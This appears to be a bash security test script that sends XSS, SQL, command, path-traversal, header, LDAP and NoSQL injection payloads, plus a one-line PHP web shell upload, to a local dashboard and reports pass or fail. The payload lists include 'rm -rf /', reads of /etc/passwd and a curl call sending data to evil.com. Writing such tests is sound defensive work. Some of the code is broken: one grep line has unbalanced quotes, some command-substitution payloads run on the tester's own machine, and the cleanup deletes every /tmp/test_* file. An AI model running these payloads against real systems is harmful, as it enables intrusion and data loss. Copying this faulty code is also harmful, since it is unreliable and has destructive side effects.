#!/bin/bash
# Input Validation and XSS Protection Tests
# Tests input validation, XSS protection, and data sanitization

set -euo pipefail

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Test configuration
SCRIPT_DIR="$(dirname "$0")"
PROJECT_ROOT="$(dirname "$SCRIPT_DIR")"
DASHBOARD_DIR="$PROJECT_ROOT/web-dashboard"
DASHBOARD_URL="http://localhost:8080"
TESTS_PASSED=0
TESTS_FAILED=0

# Test logging functions
log_test() {
    echo -e "${CYAN}🧪 $1${NC}"
}

log_pass() {
    echo -e "${GREEN}✅ $1${NC}"
    ((TESTS_PASSED++))
}

log_fail() {
    echo -e "${RED}❌ $1${NC}"
    ((TESTS_FAILED++))
}

log_info() {
    echo -e "${BLUE}ℹ️  $1${NC}"
}

log_warn() {
    echo -e "${YELLOW}⚠️  $1${NC}"
}

# Test 1: XSS Protection in Forms
test_xss_protection_forms() {
    log_test "Testing XSS Protection in Forms"
    
    # XSS payloads to test
    local xss_payloads=(
        "<script>alert('XSS')</script>"
        "<img src=x onerror=alert('XSS')>"
        "javascript:alert('XSS')"
        "<svg onload=alert('XSS')>"
        "';alert('XSS');//"
        "<iframe src=javascript:alert('XSS')>"
        "<body onload=alert('XSS')>"
        "<input onfocus=alert('XSS') autofocus>"
        "<select onfocus=alert('XSS') autofocus>"
        "<textarea onfocus=alert('XSS') autofocus>"
    )
    
    for payload in "${xss_payloads[@]}"; do
        # Test login form
        local response=$(curl -s -X POST \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -d "username=$payload&password=test" \
            "$DASHBOARD_URL/login" 2>/dev/null || echo "")
        
        if [ -n "$response" ]; then
            # Check if XSS payload is reflected without sanitization
            if echo "$response" | grep -q "$payload"; then
                log_fail "XSS payload reflected in login response: $payload"
            else
                log_pass "XSS payload sanitized in login response: $payload"
            fi
            
            # Check for HTML encoding
            if echo "$response" | grep -q "<\|>\|&\|""; then
                log_pass "HTML encoding applied for XSS payload"
            else
                log_warn "HTML encoding may not be applied for XSS payload"
            fi
        else
            log_warn "No response from login form for XSS test"
        fi
    done
}

# Test 2: SQL Injection Protection
test_sql_injection_protection() {
    log_test "Testing SQL Injection Protection"
    
    # SQL injection payloads
    local sql_payloads=(
        "' OR '1'='1"
        "admin'--"
        "' UNION SELECT 'admin','password'--"
        "'; DROP TABLE users;--"
        "' OR 1=1#"
        "admin'/**/OR/**/1=1--"
        "' UNION SELECT NULL,username,password FROM users--"
        "1' AND (SELECT COUNT(*) FROM users) > 0--"
    )
    
    for payload in "${sql_payloads[@]}"; do
        # Test login endpoint
        local response=$(curl -s -X POST \
            -H "Content-Type: application/json" \
            -d "{\"username\":\"$payload\",\"password\":\"test\"}" \
            "$DASHBOARD_URL/login" 2>/dev/null || echo "")
        
        if [ -n "$response" ]; then
            # Check for SQL error messages
            if echo "$response" | grep -qi "sql\|mysql\|sqlite\|postgres\|ora-\|syntax\|error"; then
                log_fail "SQL error message leaked: $payload"
            else
                log_pass "No SQL error leakage for: $payload"
            fi
            
            # Check for successful authentication (should not happen)
            if echo "$response" | grep -q "success\|authenticated\|token\|dashboard"; then
                log_fail "SQL injection may have succeeded: $payload"
            else
                log_pass "SQL injection blocked: $payload"
            fi
        else
            log_warn "No response from login endpoint for SQL injection test"
        fi
    done
}

# Test 3: Command Injection Protection
test_command_injection_protection() {
    log_test "Testing Command Injection Protection"
    
    # Command injection payloads
    local cmd_payloads=(
        "; ls -la"
        "| cat /etc/passwd"
        "& whoami"
        "`id`"
        "$(whoami)"
        "; rm -rf /"
        "| ping -c 10 127.0.0.1"
        "& curl http://evil.com/steal?data=\$(whoami)"
    )
    
    for payload in "${cmd_payloads[@]}"; do
        # Test various endpoints that might process user input
        local endpoints=(
            "/api/scan/start"
            "/api/behavioral/baseline"
            "/api/incidents"
        )
        
        for endpoint in "${endpoints[@]}"; do
            local response=$(curl -s -X POST \
                -H "Content-Type: application/json" \
                -d "{\"target\":\"$payload\",\"type\":\"test\"}" \
                "$DASHBOARD_URL$endpoint" 2>/dev/null || echo "")
            
            if [ -n "$response" ]; then
                # Check for command output in response
                if echo "$response" | grep -q "uid=\|gid=\|root\|bin/\|etc/\|usr/\|home/"; then
                    log_fail "Command injection may have succeeded: $payload on $endpoint"
                else
                    log_pass "Command injection blocked: $payload on $endpoint"
                fi
            fi
        done
    done
}

# Test 4: Path Traversal Protection
test_path_traversal_protection() {
    log_test "Testing Path Traversal Protection"
    
    # Path traversal payloads
    local path_payloads=(
        "../../../etc/passwd"
        "..\\..\\..\\windows\\system32\\config\\sam"
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        "....//....//....//etc/passwd"
        "..%252f..%252f..%252fetc%252fpasswd"
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
        "/var/www/../../etc/passwd"
        "file:///etc/passwd"
    )
    
    for payload in "${path_payloads[@]}"; do
        # Test file upload/download endpoints
        local response=$(curl -s -X GET \
            -G \
            --data-urlencode "file=$payload" \
            "$DASHBOARD_URL/api/download" 2>/dev/null || echo "")
        
        if [ -n "$response" ]; then
            # Check for file content
            if echo "$response" | grep -q "root:\|daemon:\|bin:\|sys:\|nobody:"; then
                log_fail "Path traversal may have succeeded: $payload"
            else
                log_pass "Path traversal blocked: $payload"
            fi
        fi
        
        # Test upload endpoint
        response=$(curl -s -X POST \
            -H "Content-Type: application/json" \
            -d "{\"path\":\"$payload\",\"content\":\"test\"}" \
            "$DASHBOARD_URL/api/upload" 2>/dev/null || echo "")
        
        if [ -n "$response" ]; then
            if echo "$response" | grep -q "success\|uploaded\|saved"; then
                log_fail "Path traversal may have succeeded in upload: $payload"
            else
                log_pass "Path traversal blocked in upload: $payload"
            fi
        fi
    done
}

# Test 5: Input Length Validation
test_input_length_validation() {
    log_test "Testing Input Length Validation"
    
    # Generate long strings
    local long_string_1000=$(printf 'A%.0s' {1..1000})
    local long_string_10000=$(printf 'B%.0s' {1..10000})
    local long_string_100000=$(printf 'C%.0s' {1..100000})
    
    local test_strings=(
        "$long_string_1000"
        "$long_string_10000"
        "$long_string_100000"
    )
    
    for i in "${!test_strings[@]}"; do
        local test_string="${test_strings[$i]}"
        local length=${#test_string}
        
        # Test username field
        local response=$(curl -s -X POST \
            -H "Content-Type: application/json" \
            -d "{\"username\":\"$test_string\",\"password\":\"test\"}" \
            "$DASHBOARD_URL/login" 2>/dev/null || echo "")
        
        if [ -n "$response" ]; then
            # Check for error message about length
            if echo "$response" | grep -q "too long\|maximum\|limit\|exceeds"; then
                log_pass "Input length validation works for ${length} characters"
            else
                log_warn "Input length validation may not be implemented for ${length} characters"
            fi
            
            # Check for buffer overflow indicators
            if echo "$response" | grep -q "segmentation\|overflow\|memory\|crash"; then
                log_fail "Possible buffer overflow with ${length} characters"
            else
                log_pass "No buffer overflow detected with ${length} characters"
            fi
        fi
    done
}

# Test 6: Special Character Handling
test_special_character_handling() {
    log_test "Testing Special Character Handling"
    
    # Special characters that could cause issues
    local special_chars=(
        "<>&|;`$(){}[]\"'\\"
        "\x00\x01\x02\x03"
        "\n\r\t"
        "😀🎉🔥💯"
        "αβγδεζηθ"
        "中文测试"
        "العربية"
        "עברית"
    )
    
    for chars in "${special_chars[@]}"; do
        # Test various input fields
        local response=$(curl -s -X POST \
            -H "Content-Type: application/json" \
            -d "{\"title\":\"Test $chars\",\"description\":\"Description with $chars\"}" \
            "$DASHBOARD_URL/api/incidents" 2>/dev/null || echo "")
        
        if [ -n "$response" ]; then
            # Check for proper handling
            if echo "$response" | grep -q "error\|invalid\|malformed"; then
                log_pass "Special characters properly handled/rejected"
            else
                log_warn "Special characters may not be properly validated"
            fi
            
            # Check for encoding issues
            if echo "$response" | grep -q "�\?"; then
                log_fail "Character encoding issues detected"
            else
                log_pass "No character encoding issues detected"
            fi
        fi
    done
}

# Test 7: File Upload Validation
test_file_upload_validation() {
    log_test "Testing File Upload Validation"
    
    # Create test files with different types
    local test_files=(
        "/tmp/test_safe.txt"
        "/tmp/test_malicious.php"
        "/tmp/test_script.js"
        "/tmp/test_executable.sh"
        "/tmp/test_large.txt"
    )
    
    # Create test files
    echo "Safe file content" > "/tmp/test_safe.txt"
    echo '<?php system($_GET["cmd"]); ?>' > "/tmp/test_malicious.php"
    echo "<script>alert('XSS')</script>" > "/tmp/test_script.js"
    echo -e "#!/bin/bash\nwhoami" > "/tmp/test_executable.sh"
    printf 'A%.0s' {1..1000000} > "/tmp/test_large.txt"  # 1MB file
    
    for test_file in "${test_files[@]}"; do
        if [ -f "$test_file" ]; then
            local filename=$(basename "$test_file")
            
            # Test file upload
            local response=$(curl -s -X POST \
                -F "file=@$test_file" \
                -F "filename=$filename" \
                "$DASHBOARD_URL/api/upload" 2>/dev/null || echo "")
            
            if [ -n "$response" ]; then
                # Check for dangerous file rejection
                if [[ "$filename" =~ \.(php|js|sh|exe|bat|cmd)$ ]]; then
                    if echo "$response" | grep -q "error\|invalid\|not.*allowed\|dangerous"; then
                        log_pass "Dangerous file type rejected: $filename"
                    else
                        log_fail "Dangerous file type accepted: $filename"
                    fi
                fi
                
                # Check for file size validation
                if [ "$filename" = "test_large.txt" ]; then
                    if echo "$response" | grep -q "error\|too.*large\|size.*limit"; then
                        log_pass "Large file size rejected"
                    else
                        log_fail "Large file size accepted"
                    fi
                fi
            else
                log_warn "No response from file upload endpoint"
            fi
        fi
    done
    
    # Cleanup test files
    for test_file in "${test_files[@]}"; do
        rm -f "$test_file"
    done
}

# Test 8: HTTP Header Injection
test_http_header_injection() {
    log_test "Testing HTTP Header Injection"
    
    # HTTP header injection payloads
    local header_payloads=(
        "Test\r\nSet-Cookie: malicious=true"
        "Test%0d%0aSet-Cookie: malicious=true"
        "Test\nLocation: http://evil.com"
        "Test%0aLocation: http://evil.com"
        "Test\r\nX-Forwarded-For: 127.0.0.1"
    )
    
    for payload in "${header_payloads[@]}"; do
        # Test various endpoints that might include user input in headers
        local response=$(curl -s -X GET \
            -H "User-Agent: $payload" \
            -H "Referer: $payload" \
            "$DASHBOARD_URL/" 2>/dev/null || echo "")
        
        if [ -n "$response" ]; then
            # Check for header injection in response
            if echo "$response" | grep -q "malicious=true\|evil.com\|X-Forwarded-For"; then
                log_fail "HTTP header injection may have succeeded: $payload"
            else
                log_pass "HTTP header injection blocked: $payload"
            fi
        fi
        
        # Test with user input that might be reflected in headers
        response=$(curl -s -X POST \
            -H "Content-Type: application/json" \
            -d "{\"username\":\"$payload\",\"password\":\"test\"}" \
            "$DASHBOARD_URL/login" 2>/dev/null || echo "")
        
        if [ -n "$response" ]; then
            if echo "$response" | grep -q "malicious=true\|evil.com"; then
                log_fail "HTTP header injection in response: $payload"
            else
                log_pass "HTTP header injection in response blocked: $payload"
            fi
        fi
    done
}

# Test 9: LDAP Injection Protection
test_ldap_injection_protection() {
    log_test "Testing LDAP Injection Protection"
    
    # LDAP injection payloads
    local ldap_payloads=(
        "*)(&"
        "*)(|(objectClass=*"
        "*)(|(password=*"
        "admin)(&(password=*"
        "*))%00"
        "*)\00"
        "admin*"
        "*"
    )
    
    for payload in "${ldap_payloads[@]}"; do
        # Test login endpoint (might use LDAP authentication)
        local response=$(curl -s -X POST \
            -H "Content-Type: application/json" \
            -d "{\"username\":\"$payload\",\"password\":\"test\"}" \
            "$DASHBOARD_URL/login" 2>/dev/null || echo "")
        
        if [ -n "$response" ]; then
            # Check for successful authentication (should not happen with LDAP injection)
            if echo "$response" | grep -q "success\|authenticated\|token\|dashboard"; then
                log_fail "LDAP injection may have succeeded: $payload"
            else
                log_pass "LDAP injection blocked: $payload"
            fi
            
            # Check for LDAP error messages
            if echo "$response" | grep -qi "ldap\|active.*directory\|invalid.*credentials"; then
                log_pass "LDAP error handling implemented"
            else
                log_warn "LDAP error handling may not be implemented"
            fi
        fi
    done
}

# Test 10: NoSQL Injection Protection
test_nosql_injection_protection() {
    log_test "Testing NoSQL Injection Protection"
    
    # NoSQL injection payloads
    local nosql_payloads=(
        '{"$ne": null}'
        '{"$gt": ""}'
        '{"$regex": ".*"}'
        '{"$where": "this.username == this.password"}'
        '{"$or": [{"username": "admin"}, {"password": "admin"}]}'
        '{"$nin": []}'
        '{"$exists": true}'
    )
    
    for payload in "${nosql_payloads[@]}"; do
        # Test API endpoints that might use NoSQL
        local response=$(curl -s -X POST \
            -H "Content-Type: application/json" \
            -d "{\"username\":$payload,\"password\":\"test\"}" \
            "$DASHBOARD_URL/login" 2>/dev/null || echo "")
        
        if [ -n "$response" ]; then
            # Check for successful authentication (should not happen with NoSQL injection)
            if echo "$response" | grep -q "success\|authenticated\|token\|dashboard"; then
                log_fail "NoSQL injection may have succeeded: $payload"
            else
                log_pass "NoSQL injection blocked: $payload"
            fi
            
            # Check for database error messages
            if echo "$response" | grep -qi "mongo\|bson\|document\|collection\|database"; then
                log_fail "Database error leaked: $payload"
            else
                log_pass "No database error leakage: $payload"
            fi
        fi
    done
}

# Cleanup function
cleanup() {
    log_info "Cleaning up input validation test environment..."
    
    # Clean up any temporary files created during tests
    find /tmp -name "test_*" -delete 2>/dev/null || true
}

# Main test execution
main() {
    echo -e "${WHITE}========================================${NC}"
    echo -e "${WHITE}🛡️ INPUT VALIDATION AND XSS PROTECTION TESTS 🛡️${NC}"
    echo -e "${WHITE}========================================${NC}"
    echo -e "${BLUE}Test started: $(date)${NC}"
    echo ""
    
    # Set up cleanup trap
    trap cleanup EXIT
    
    # Run all tests
    test_xss_protection_forms
    test_sql_injection_protection
    test_command_injection_protection
    test_path_traversal_protection
    test_input_length_validation
    test_special_character_handling
    test_file_upload_validation
    test_http_header_injection
    test_ldap_injection_protection
    test_nosql_injection_protection
    
    # Test results summary
    echo ""
    echo -e "${WHITE}========================================${NC}"
    echo -e "${WHITE}📊 TEST RESULTS SUMMARY${NC}"
    echo -e "${WHITE}========================================${NC}"
    echo -e "${GREEN}Tests Passed: $TESTS_PASSED${NC}"
    echo -e "${RED}Tests Failed: $TESTS_FAILED${NC}"
    
    local total_tests=$((TESTS_PASSED + TESTS_FAILED))
    echo -e "${BLUE}Total Tests: $total_tests${NC}"
    
    if [ "$TESTS_FAILED" -eq 0 ]; then
        echo -e "${GREEN}🎉 ALL INPUT VALIDATION TESTS PASSED!${NC}"
        exit 0
    else
        echo -e "${RED}⚠️ $TESTS_FAILED test(s) failed. Review issues above.${NC}"
        exit 1
    fi
}

# Run main function
main "$@"